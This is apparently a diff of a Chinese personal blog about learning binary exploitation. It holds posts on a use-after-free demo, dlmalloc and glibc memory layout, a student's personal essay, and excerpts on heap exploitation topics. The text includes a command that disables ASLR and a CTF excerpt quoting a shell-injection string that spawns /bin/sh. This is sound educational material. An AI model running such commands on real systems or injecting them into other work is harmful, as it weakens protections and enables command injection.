-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include&lt;stdio.h&gt;</span></span><br><span class="line">int <span class="function"><span class="title">main</span></span>()&#123;</span><br><span class="line">	char *p1;</span><br><span class="line">	p1=(char *)malloc(sizeof(char)*10);</span><br><span class="line">	memcpy(p1,<span class="string">&quot;hello&quot;</span>,10);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;p1 addr:%x,%s\n&quot;</span>,p1,p1);</span><br><span class="line">	free(p1);</span><br><span class="line">	char *p2;</span><br><span class="line">	p2=(char *)malloc(sizeof(char)*10);</span><br><span class="line">	memcpy(p2,<span class="string">&quot;world&quot;</span>,10);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;p2 addr:%x,%s\n&quot;</span>,p2,p1);</span><br><span class="line">	<span class="built_in">return</span> 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>如上代码所示，<br>指针p1申请内存，打印其地址和字符串，然后释放p1<br>然后指针p2申请同样大小的内存，打印p2的地址和值<br>GCC编译，运行结果如下：<br><img src="/2021/05/03/UAF%E6%BC%8F%E6%B4%9E/1.png" alt="1.png"><br>p1与p2地址相同，p1指针释放后，p2申请相同大小的内存，操作系统会将之前给p1分配的地址分配给p2，修改p2的值，p1也被修改了。</p>
-<p>结论：<br>1.在free掉一块内存后，紧接着申请大小相同的内存，操作系统会将刚刚free掉的内存再次分配。<br>2.通过p2能够操作p1，如果之后p1继续被使用（use after free），则可以通过p2修改程序功能等目的。</p>
-<p>根本原因：说来话长，可以尝试理解dlmalloc</p>
-<h2 id="dlmalloc详解"><a href="#dlmalloc详解" class="headerlink" title="dlmalloc详解"></a>dlmalloc详解</h2><p>c语言程序会向栈和堆申请内存，小块内存向栈申请，函数调用结束后程序会自动释放内存。大块内存向堆申请，需要自己释放，否则会造成内存泄露。</p>
-<p>堆的申请涉及到动态内存管理，包括内核层面和用户层面。linux内核向应用程序提供了接口（系统调用brk和mmap），当应用程序需要申请内存时向内核提出请求。</p>
-<p>内存分配器避免了应用程序直接调用brk和mmap，应用程序在申请内存时，直接向内存分配器提交申请。有了内存分配器，我们可以避免brk和mmap的系统调用而直接通过malloc和free两个接口函数管理内存。申请内存时，内存分配器会一次向内核申请大量内存，然后分批交给应用程序，从而提高了效率。释放内存时，应用程序也是将内存释放给内存分配器，内存分配器在合适的时候再将内存释放回内核。</p>
-<p>dlmalloc就是一种内存分配器，用于Android系统。而linux中采用的是ptmalloc内存分配器，它在dlmalloc的基础上进行了改进，以更好适应多线程。dlmalloc采用两种方式申请内存，如果应用程序单次申请的内存量小于256kb，dlmalloc调用brk()扩展进程堆空间，但是dlmalloc向内存申请的内存量大于应用程序申请的内存量，申请到内存后dlmalloc将内存分成两块，一块返回给应用程序，另一块作为空闲内存先保留起来。下次应用程序申请内存时dlmalloc就不需要向内核申请内存了，从而加快分配效率。当应用程序调用free释放内存时，如果内存块小于256kb，dlmalloc并不马上将内存块释放回内存，而是将内存标记为空闲状态。这么做的原因有两个：一是内存块不一定能马上释放回内核，二是供应用程序下次申请内存使用。当dlmalloc中空闲内存量达到一定值时dlmalloc才将空闲内存释放回内核。如果应用程序申请的内存大于256kb,dlmalloc调用mmap()向内存内核申请一块内存，返回返还给应用程序使用。如果应用程序释放的内存大于256kb，dlmalloc马上调用munmap()释放内存。dlmalloc不会缓存大于256kb的内存块，因为这样的内存块太大了，最好不要长期占用这么大的内存资源。</p>
-<p>brk()系统调用可以扩充或收缩堆的大小，mmap()向内核申请内存，munmap则释放内存。</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2021/05/03/UAF%E6%BC%8F%E6%B4%9E/" data-id="cko8s57zf0000c0u6gby29mx5" data-title="UAF漏洞初探" class="article-share-link">分享</a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-人活着就是为了——北京邮电大学" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2021/05/02/%E4%BA%BA%E6%B4%BB%E7%9D%80%E5%B0%B1%E6%98%AF%E4%B8%BA%E4%BA%86%E2%80%94%E2%80%94%E5%8C%97%E4%BA%AC%E9%82%AE%E7%94%B5%E5%A4%A7%E5%AD%A6/" class="article-date">
-  <time class="dt-published" datetime="2021-05-03T04:24:41.000Z" itemprop="datePublished">2021-05-03</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2021/05/02/%E4%BA%BA%E6%B4%BB%E7%9D%80%E5%B0%B1%E6%98%AF%E4%B8%BA%E4%BA%86%E2%80%94%E2%80%94%E5%8C%97%E4%BA%AC%E9%82%AE%E7%94%B5%E5%A4%A7%E5%AD%A6/">人活着就是为了——北京邮电大学</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h2 id="与网络安全结缘"><a href="#与网络安全结缘" class="headerlink" title="与网络安全结缘"></a>与网络安全结缘</h2><p>高考填志愿都是十分随便的，分数踩上了就报了电子信息工程这个专业，好像还和计算机由那么一点点联系。<br>填都填了那就读呗。<br>刚刚进入大一，一切都是那么的新奇。大学校园摆脱了高中的枯燥，要协会有协会，要部门有部门，好玩的活动一大堆，于是抱着尝试新奇事物的心情开始了大学生涯。<br>我本身爱好就十分广泛，就大一上个学期就玩遍了各种协会（网络安全协会也加了，那时候还沉寂着），加了一个部门，其中包括程序设计协会，开始蹒跚学C，写着那些看上去很牛逼的算法。<br>但是所有的变化都源自于一位17级电信学长不经意的一句话。<br>就在半学期之后，我瞬间退了所有协会部门的群，专心学C语言，那时候还在网上整了贪吃蛇程序玩了一下。<br>但是网上找了各种关于IT和程序员的资料，发现学会C语言也没什么大不了的。当时回忆起了高中时代在电视剧上看的黑客情景，就对黑客着了迷。<br>当时是没心情认真准备期末考的。后半个学期天天搜黑客关键字，迷上了command命令，据说黑客都是通过命令行攻击的。从网上还知道了各种厉害的黑客人物。有一次在群里面看到了国科培训，也过去听了几天。<br>期末考虽然没挂科，但是也成绩平平。</p>
-<p>到了下学期，正值疫情期间，开始在网络安全协会里面混，整了个CSDN账号，抱紧各种大佬的大腿。当时杂项、密码学、web满天飞，糊里糊涂地下了各种工具，还专门从百度云找了web入门视频（虽然到现在都没用过)。<br>半个学期的时光又虚度了，平时不好好读书写作业，却在这玩意上耗了不少时间。<br>后来在一位大佬的引荐下（其人可是现在的360网络安全研究员），我混进了内部群。啧啧，群除我佬，但是就是没有二进制佬。于是心中就萌生了新的想法。<br>那不如学二进制吧，反正电信也是吃底层的，学得不好也可以在里面凑凑数，至少有学底层的萌新了。<br>然后又是百度关键词满天飞，搜了一大堆的入门资料，反正是没学会，弯路倒是走了不少。</p>
-<p>pwn就这么搞了几个月，就在我快要弃坑的时候，当时安全的群又退了几个。又是那位360大佬提点我。我永远都忘不了那一天，如果没有那一次，我估计要永远与网络安全失之交臂了。就是他，给了我继续学习网安的希望。<br>因为对于一个萌新而言，而且是唯一一个学二进制的选手，在没有二进制大佬的带领下，仅仅靠百度关键词的搜索，学习是非常困难的。当时想学二进制，但是又不知从何学起。<br>坑都入了，那就学到海枯石烂吧，这是我一个人的主场。</p>
-<h2 id="幸运的转折"><a href="#幸运的转折" class="headerlink" title="幸运的转折"></a>幸运的转折</h2><p>期末考不用说了，又是60分万岁。但是我在pwn的道路上才刚刚开始。<br>大二一开学，我强行挤进实验室，这真是个堪比穆斯林心目中的耶路撒冷，是个神圣的地方。在网安摸爬滚打一个学期后，20网安新生的到来给了我惊喜，这就意味着，我可以拉人下水，再也不用孤军奋战，一个人正这个没有尽头的pwn了。而且我拉的学弟个个生猛，学pwn一点也不虚。</p>
-<h2 id="思想的洗礼"><a href="#思想的洗礼" class="headerlink" title="思想的洗礼"></a>思想的洗礼</h2><p>我是一个电信专业中不折不扣的混子选手，因为我不喜欢电信专业，我只是尽可能保持着0补考的战绩。但是我对不朽的追求却从来没有停止过。<br>除了学网安以外，我的确是一个爱好广泛的人。<br>为了学英语，课余时间我会抽时间看记录片，至今已经积累了几百个视频，从图书馆阅读外刊。<br>为了学商业知识，我还特意把巴菲特的投资哲学阅读了好多遍，十分了解股市原理。<br>为了阅读更多的鸡汤，我还与我们的专业第一成为了好友，同时我们还是老乡，现在是知己。</p>
-<p>我只是一名工科生，但是长期阅读的积累给我带来了内在的改变。也许是看多了拿破仑、亚历山大、巴菲特、武则天，接触了太多的本校的电信、网安、计科大佬和外校的985大牛，从阅读中积累了太多太多的鸡汤，在操场上跑了太多太多圈，看多了太多的人类思维、学习方法，我的三观一直不断的被重塑。在之前，我就甘愿成为一个宇宙中一个不起眼的沙砾；但现在，我就渴望成为能够让海洋波涛汹涌的浪花。<br>阅读和文学的洗礼真的能改变一个人。</p>
-<h2 id="艰难的抉择"><a href="#艰难的抉择" class="headerlink" title="艰难的抉择"></a>艰难的抉择</h2><p>今已经大二下了，虽然网安进展缓慢，但是依然没有放弃的心。电信与我无缘，那我就考到网安。<br>这个问题其实一直萦绕在我的脑海里，必须二选一。条条大路通罗马，这世界上并不缺路可走，难的是选择一条道路并鼓起勇气一直走下去。<br>不管如何抉择，我都知道，长板决定了上限。<br>既然要走，就要走的最好；既然要走，就要走去最远的地方。<br>因为：<br><img src="/2021/05/03/%E4%BA%BA%E6%B4%BB%E7%9D%80%E5%B0%B1%E6%98%AF%E4%B8%BA%E4%BA%86%E2%80%94%E2%80%94%E5%8C%97%E4%BA%AC%E9%82%AE%E7%94%B5%E5%A4%A7%E5%AD%A6/1.png" alt="1.png"><br>在此沿用丘吉尔和特朗普的优良传统：NEVER EVER GIVE UP!<br>祝自己考研顺利！</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2021/05/02/%E4%BA%BA%E6%B4%BB%E7%9D%80%E5%B0%B1%E6%98%AF%E4%B8%BA%E4%BA%86%E2%80%94%E2%80%94%E5%8C%97%E4%BA%AC%E9%82%AE%E7%94%B5%E5%A4%A7%E5%AD%A6/" data-id="cko85vl2f0000q0u66krldx5t" data-title="人活着就是为了——北京邮电大学" class="article-share-link">分享</a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-堆溢出必备基础——Glibc内存管理（1）" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2021/05/01/%E5%A0%86%E6%BA%A2%E5%87%BA%E5%BF%85%E5%A4%87%E5%9F%BA%E7%A1%80%E2%80%94%E2%80%94Glibc%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86%EF%BC%881%EF%BC%89/" class="article-date">
-  <time class="dt-published" datetime="2021-05-02T05:20:27.000Z" itemprop="datePublished">2021-05-02</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2021/05/01/%E5%A0%86%E6%BA%A2%E5%87%BA%E5%BF%85%E5%A4%87%E5%9F%BA%E7%A1%80%E2%80%94%E2%80%94Glibc%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86%EF%BC%881%EF%BC%89/">堆溢出必备基础——Glibc内存管理与ptmalloc源码分析（1）</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h2 id="一、什么是glibc？glibc与libc的区别？"><a href="#一、什么是glibc？glibc与libc的区别？" class="headerlink" title="一、什么是glibc？glibc与libc的区别？"></a>一、什么是glibc？glibc与libc的区别？</h2><p>glibc和libc都是linux下的c函数库，但是libc是linux下的ANSI C的函数库，glibc是GUN C的函数库。</p>
-<p>glibc是gnu发布的libc库，也是c运行库。glibc是linux系统中最底层的API（应用程序开发接口），几乎其他任何的运行库都会依赖于glibc。glibc封装了linux操作系统所提供的系统服务。</p>
-<p>延伸问题——ANSI C和GUN C是什么玩意？<br>ANSI C：美国国家标准协会（ANSI）对C语言发布的标准<br>GUN C：简单理解为GUN组织对C语言发布的标准</p>
-<h2 id="二、linux进程内存布局"><a href="#二、linux进程内存布局" class="headerlink" title="二、linux进程内存布局"></a>二、linux进程内存布局</h2><h3 id="32位模式下进程内存经典布局"><a href="#32位模式下进程内存经典布局" class="headerlink" title="32位模式下进程内存经典布局"></a>32位模式下进程内存经典布局</h3><p><img src="/2021/05/02/%E5%A0%86%E6%BA%A2%E5%87%BA%E5%BF%85%E5%A4%87%E5%9F%BA%E7%A1%80%E2%80%94%E2%80%94Glibc%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86%EF%BC%881%EF%BC%89/1.png" alt="1.png"></p>
-<p>这种布局是linux内核2.6.7以前的默认进程内存布局形式，mmap区域和栈区域相对增长，这意味着堆中只有1GB的内存地址空间可以使用，继续增长就会进入mmap映射区域，这是该内核版本的缺陷。这是由于32位模式地址空间限制造成的，所以内核引入了另一种虚拟地址空间的布局形式。但是对于64位系统而言，它提供了巨大的虚拟地址空间，这种布局就相当好。</p>
-<h3 id="32位模式下进程默认内存布局"><a href="#32位模式下进程默认内存布局" class="headerlink" title="32位模式下进程默认内存布局"></a>32位模式下进程默认内存布局</h3><p><img src="/2021/05/02/%E5%A0%86%E6%BA%A2%E5%87%BA%E5%BF%85%E5%A4%87%E5%9F%BA%E7%A1%80%E2%80%94%E2%80%94Glibc%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86%EF%BC%881%EF%BC%89/2.png" alt="2.png"></p>
-<p>从上图可以看到，栈至顶向下扩展，并且栈是有界的。堆至底向上扩展，mmap映射区域至顶向下扩展，直至耗尽虚拟地址空间中的剩余区域，这种结构便于C运行时库使用mmap映射区域和堆进行内存分配。上图的布局形式是在内核2.6.7以后才引入的，这是32位模式下进程的默认内存布局形式。</p>
-<h3 id="64位模式下进程内存布局"><a href="#64位模式下进程内存布局" class="headerlink" title="64位模式下进程内存布局"></a>64位模式下进程内存布局</h3><p>在64位模式下各个区域的起始位置是什么呢？对于AMD64系统，内存布局采用经典内存布局，text的起始地址为，text的起始地址为0x0000000000400000，堆紧接着BSS段向上增长，mmap映射区域开始位置一般设为TASK_SIZE/3。<br>下面的图我其实看不懂（不知道怎么算地址）直接贴出来：<br><img src="/2021/05/02/%E5%A0%86%E6%BA%A2%E5%87%BA%E5%BF%85%E5%A4%87%E5%9F%BA%E7%A1%80%E2%80%94%E2%80%94Glibc%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86%EF%BC%881%EF%BC%89/3.png" alt="3.png"></p>
-<p><img src="/2021/05/02/%E5%A0%86%E6%BA%A2%E5%87%BA%E5%BF%85%E5%A4%87%E5%9F%BA%E7%A1%80%E2%80%94%E2%80%94Glibc%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86%EF%BC%881%EF%BC%89/4.png" alt="4.png"><br>上图是X86_64下的linux进程的默认内存布局形式，这只是一个示意图，当前内核默认配置下，进程的栈和mmap映射区域并不是从一个固定地址开始，并且每次启动时的值都不一样，这是程序启动时随机改变这些值的设置，使得使用缓冲区溢出进行攻击更加困难。在CTF中，这种保护叫做ASLR。当然也可以让进程中的栈和mmap映射区域从一个固定位置开始，只需要设置全局变量randomize_va_space的值为0，这个变量默认值为1。用户可以通过设置/proc/sys/kernel/randomize_va_space来停用该特性，也可以用如下命令：<br>sudo sysctl -w kernel.randomize_va_space=0</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2021/05/01/%E5%A0%86%E6%BA%A2%E5%87%BA%E5%BF%85%E5%A4%87%E5%9F%BA%E7%A1%80%E2%80%94%E2%80%94Glibc%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86%EF%BC%881%EF%BC%89/" data-id="cko6rhiga00003ou67s1relox" data-title="堆溢出必备基础——Glibc内存管理与ptmalloc源码分析（1）" class="article-share-link">分享</a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-
-
-  <nav id="page-nav">
-    
-    <a class="extend prev" rel="prev" href="/page/2/">&laquo; 上一页</a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/">4</a><a class="extend next" rel="next" href="/page/4/">下一页 &raquo;</a>
-  </nav>
-
-</section>
-        
-          <aside id="sidebar">
-  
-    
-
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">标签</h3>
-    <div class="widget">
-      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%9C%89%E7%82%B9%E6%83%85%E4%B8%8D%E8%87%AA%E7%A6%81%EF%BC%8C%E4%BD%86%E7%9A%86%E8%82%BA%E8%85%91%E4%B9%8B%E8%A8%80%EF%BC%8C%E6%9C%9B%E5%B9%BF%E5%A4%A7pwner%E6%90%BA%E8%B5%B7%E6%89%8B%E6%9D%A5%E4%B8%80%E8%B5%B7%E5%89%8D%E8%BF%9B/" rel="tag">有点情不自禁，但皆肺腑之言，望广大pwner携起手来一起前进</a></li></ul>
-    </div>
-  </div>
-
-
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">标签云</h3>
-    <div class="widget tagcloud">
-      <a href="/tags/%E6%9C%89%E7%82%B9%E6%83%85%E4%B8%8D%E8%87%AA%E7%A6%81%EF%BC%8C%E4%BD%86%E7%9A%86%E8%82%BA%E8%85%91%E4%B9%8B%E8%A8%80%EF%BC%8C%E6%9C%9B%E5%B9%BF%E5%A4%A7pwner%E6%90%BA%E8%B5%B7%E6%89%8B%E6%9D%A5%E4%B8%80%E8%B5%B7%E5%89%8D%E8%BF%9B/" style="font-size: 10px;">有点情不自禁，但皆肺腑之言，望广大pwner携起手来一起前进</a>
-    </div>
-  </div>
-
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">归档</h3>
-    <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/07/">七月 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/06/">六月 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/05/">五月 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/04/">四月 2021</a></li></ul>
-    </div>
-  </div>
-
-
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">最新文章</h3>
-    <div class="widget">
-      <ul>
-        
-          <li>
-            <a href="/2021/07/04/pwn%E5%85%A5%E9%97%A8%E7%B3%BB%E5%88%978%E2%80%94%E2%80%94%E5%9F%BA%E6%9C%AC%E6%A0%88%E6%BA%A2%E5%87%BA/">Pwn入门系列8——基本栈溢出</a>
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
           </li>
         
-          <li>
-            <a href="/2021/07/04/pwn%E5%85%A5%E9%97%A8%E7%B3%BB%E5%88%977%E2%80%94%E2%80%94%E6%A0%88%E6%BA%A2%E5%87%BA%E5%8E%9F%E7%90%86/">Pwn入门系列7——栈溢出原理</a>
-          </li>
         
-          <li>
-            <a href="/2021/07/02/pwn%E5%85%A5%E9%97%A8%E7%B3%BB%E5%88%976%E2%80%94%E2%80%94linux%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/">Pwn入门系列6——linux保护机制</a>
-          </li>
-        
-          <li>
-            <a href="/2021/07/01/pwn%E5%85%A5%E9%97%A8%E7%B3%BB%E5%88%975%E2%80%94%E2%80%94linux%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A%E6%9C%BA%E5%88%B6/">Pwn入门系列5——linux延迟绑定机制</a>
-          </li>
-        
-          <li>
-            <a href="/2021/06/30/pwn%E5%85%A5%E9%97%A8%E7%B3%BB%E5%88%974%E2%80%94%E2%80%94ELF%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F/">pwn入门系列4——ELF文件格式</a>
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
           </li>
         
       </ul>
     </div>
   </div>
+</nav>
 
-  
-</aside>
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="An elegant Material-Design theme for Hexo">
+              
+            </span>
+
+            
+          </div>
+
+          
+            <div class="scroll-down-bar">
+              <i class="iconfont icon-arrowdown"></i>
+            </div>
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      <div class="container nopadding-x-md">
+        <div class="py-5" id="board"
+          style=margin-top:0>
+          
+          <div class="container">
+            <div class="row">
+              <div class="col-12 col-md-10 m-auto">
+                
+
+
+  <div class="row mx-auto index-card">
+    
+    
+    <article class="col-12 col-md-12 mx-auto index-info">
+      <h1 class="index-header">
+        
+        <a href="/2021/06/19/linux%E5%8A%A8%E6%80%81%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86%E6%9C%BA%E5%88%B6/" target="_self">
+          Linux动态内存管理机制
+        </a>
+      </h1>
+
+      <p class="index-excerpt">
+        <a href="/2021/06/19/linux%E5%8A%A8%E6%80%81%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86%E6%9C%BA%E5%88%B6/" target="_self">
+          
+          
+            
+          
+          进程与内存1、进程如何使用内存毫无疑问，所有进程（执行的程序）都必须占有一定数量的内存，它或是用来存放从磁盘载入的程序代码，或是存取自用户输入的数据等等。不过进程对这些内存的管理方式因为内存用途不一而不尽相同，有些内存是事先静态分配和统一回收的，而有些却是需要动态分配和回收的。
+对于任何一个普通进程来讲，它都会涉及到5种不同的数据段。稍有些编程知识的朋友都能想到这几个数据段中包含有“程序代码段”、
+        </a>
+      </p>
+
+      <div class="index-btm post-metas">
+        
+          <div class="post-meta mr-3">
+            <i class="iconfont icon-date"></i>
+            <time datetime="2021-06-19 20:53" pubdate>
+              2021-06-19
+            </time>
+          </div>
+        
+        
         
       </div>
-      <footer id="footer">
-  
-  <div class="outer">
-    <div id="footer-info" class="inner">
-      
-      &copy; 2021 Saku376<br>
-      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
-    </div>
+    </article>
   </div>
-</footer>
 
-    </div>
-    <nav id="mobile-nav">
-  
-    <a href="/" class="mobile-nav-link">Home</a>
-  
-    <a href="/archives" class="mobile-nav-link">Archives</a>
-  
-</nav>
+  <div class="row mx-auto index-card">
+    
+    
+    <article class="col-12 col-md-12 mx-auto index-info">
+      <h1 class="index-header">
+        
+        <a href="/2021/06/16/%E5%A0%86%E6%BA%A2%E5%87%BA%E5%88%A9%E7%94%A8%E4%B9%8Bfastbin/" target="_self">
+          堆溢出利用之Fastbin
+        </a>
+      </h1>
+
+      <p class="index-excerpt">
+        <a href="/2021/06/16/%E5%A0%86%E6%BA%A2%E5%87%BA%E5%88%A9%E7%94%A8%E4%B9%8Bfastbin/" target="_self">
+          
+          
+            
+          
+          前半部分 ：基于libc2.23（无tcache）堆机制(fastbin等)想要了解堆机制利用方法必须要先了解堆的基本机制以及结构
+目前主要使用的内存管理库是ptmalloc，而在ptmalloc中，用户请求的空间由名为chunk的数据结构表示
+下面就是一个标准的chunk结构该chunk中，prev_size参数为前一chunk的大小，size参数为该chunk的大小，而p参数（pre_insu
+        </a>
+      </p>
+
+      <div class="index-btm post-metas">
+        
+          <div class="post-meta mr-3">
+            <i class="iconfont icon-date"></i>
+            <time datetime="2021-06-17 05:54" pubdate>
+              2021-06-17
+            </time>
+          </div>
+        
+        
+        
+      </div>
+    </article>
+  </div>
+
+  <div class="row mx-auto index-card">
+    
+    
+    <article class="col-12 col-md-12 mx-auto index-info">
+      <h1 class="index-header">
+        
+        <a href="/2021/06/14/bin/" target="_self">
+          Bin
+        </a>
+      </h1>
+
+      <p class="index-excerpt">
+        <a href="/2021/06/14/bin/" target="_self">
+          
+          
+            
+          
+          Fastbin大多数程序经常会申请以及释放比较小的内存块。如果将一些较小的chunk释放之后发现存在与之相邻的空闲chunk并将它们进行合并，那么当下一次再次申请相应大小的chunk时，就需要对chunk进行分割，这样就大大降低了堆的利用效率。因为我们把大部分时间花在了合并、分割以及中间检查的过程中。因此,ptmalloc中专门设计了fastbin，对应的变量就是malloc state中的fas
+        </a>
+      </p>
+
+      <div class="index-btm post-metas">
+        
+          <div class="post-meta mr-3">
+            <i class="iconfont icon-date"></i>
+            <time datetime="2021-06-14 23:43" pubdate>
+              2021-06-14
+            </time>
+          </div>
+        
+        
+        
+      </div>
+    </article>
+  </div>
+
+  <div class="row mx-auto index-card">
+    
+    
+    <article class="col-12 col-md-12 mx-auto index-info">
+      <h1 class="index-header">
+        
+        <a href="/2021/06/14/%E5%A0%86%E6%A6%82%E8%BF%B0/" target="_self">
+          堆概述
+        </a>
+      </h1>
+
+      <p class="index-excerpt">
+        <a href="/2021/06/14/%E5%A0%86%E6%A6%82%E8%BF%B0/" target="_self">
+          
+          
+            
+          
+          什么是堆在程序运行的过程中，堆可以提供动态分配的内存，允许程序申请大小未知的内存。堆其实就是程序虚拟空间的一块连续的线性区域，它由低地址向高地址增长。我们一般称管理堆的那部分程序为堆管理器。
+对管理器处于用户程序与内核中间，主要做以下工作
+1.响应用户的申请内存请求，向操作系统申请内存，然后将其返回给用户程序。同时，为了保持内存管理的高效性，内核一般都会预先分配很大的一块连续的内存，然后让堆管理器
+        </a>
+      </p>
+
+      <div class="index-btm post-metas">
+        
+          <div class="post-meta mr-3">
+            <i class="iconfont icon-date"></i>
+            <time datetime="2021-06-14 22:08" pubdate>
+              2021-06-14
+            </time>
+          </div>
+        
+        
+        
+      </div>
+    </article>
+  </div>
+
+  <div class="row mx-auto index-card">
+    
+    
+    <article class="col-12 col-md-12 mx-auto index-info">
+      <h1 class="index-header">
+        
+        <a href="/2021/06/12/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%A0%86%E6%BA%A2%E5%87%BAUAF-time-formatter/" target="_self">
+          攻防世界堆溢出UAF_time_formatter
+        </a>
+      </h1>
+
+      <p class="index-excerpt">
+        <a href="/2021/06/12/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%A0%86%E6%BA%A2%E5%87%BAUAF-time-formatter/" target="_self">
+          
+          
+            
+          
+          知识点1在linux shell中，假如有如下语句，这就是shell注入方面echo “;ls;cat 1.txt;/bin/sh;”则 ls 、cat 1.txt 、/bin/sh 这三个命令就会一次执行，这也是本题突破的关键
+知识点2C语言或C++申请内存后，用free 或 delete 释放堆后，指针的值还在，如果不手动设置为NULL，就可以被我们利用。
+堆内存的分配有规律，看如下代码：
+1
+        </a>
+      </p>
+
+      <div class="index-btm post-metas">
+        
+          <div class="post-meta mr-3">
+            <i class="iconfont icon-date"></i>
+            <time datetime="2021-06-13 07:34" pubdate>
+              2021-06-13
+            </time>
+          </div>
+        
+        
+        
+      </div>
+    </article>
+  </div>
+
+  <div class="row mx-auto index-card">
+    
+    
+    <article class="col-12 col-md-12 mx-auto index-info">
+      <h1 class="index-header">
+        
+        <a href="/2021/06/11/Unlink/" target="_self">
+          Unlink
+        </a>
+      </h1>
+
+      <p class="index-excerpt">
+        <a href="/2021/06/11/Unlink/" target="_self">
+          
+          
+            
+          
+          Unlink我们在利用unlink所造成的漏洞是，其实就是对chunk进行内存布局，然后借助unlink操作来达成修改指针的效果。
+我们先来简单回顾一下unlink的目的与过程，其目的是把一个双向链表中的空闲块拿出来（例如free时和目前物理相邻的free chunk进行合并）。其基本的过程如下：下面我们首先介绍一下unlink最初没有防护时的利用方法，然后介绍目前利用Unlink的方式。
+古老的
+        </a>
+      </p>
+
+      <div class="index-btm post-metas">
+        
+          <div class="post-meta mr-3">
+            <i class="iconfont icon-date"></i>
+            <time datetime="2021-06-12 00:17" pubdate>
+              2021-06-12
+            </time>
+          </div>
+        
+        
+        
+      </div>
+    </article>
+  </div>
+
+  <div class="row mx-auto index-card">
+    
+    
+    <article class="col-12 col-md-12 mx-auto index-info">
+      <h1 class="index-header">
+        
+        <a href="/2021/06/11/off-by-one/" target="_self">
+          Off-by-One
+        </a>
+      </h1>
+
+      <p class="index-excerpt">
+        <a href="/2021/06/11/off-by-one/" target="_self">
+          
+          
+            
+          
+          堆溢出之off by one介绍严格来说off-by-one漏洞是一种特殊的溢出漏洞，off by one 指向缓冲区中写入时，写入的字节数超过了这个缓冲区本身所申请的字节数并且只越界了一个字节。
+off by one 漏洞原理off by one是指单字节缓冲区溢出，这种漏洞的产生往往与边界验证不严和字符串操作有关，当然也不排除写入的size就只多了一个字节的情况。其中边界验证不严通常包括：
+①
+        </a>
+      </p>
+
+      <div class="index-btm post-metas">
+        
+          <div class="post-meta mr-3">
+            <i class="iconfont icon-date"></i>
+            <time datetime="2021-06-11 23:40" pubdate>
+              2021-06-11
+            </time>
+          </div>
+        
+        
+        
+      </div>
+    </article>
+  </div>
+
+  <div class="row mx-auto index-card">
+    
+    
+    <article class="col-12 col-md-12 mx-auto index-info">
+      <h1 class="index-header">
+        
+        <a href="/2021/06/05/2021CISCN-PWN%E9%A2%98/" target="_self">
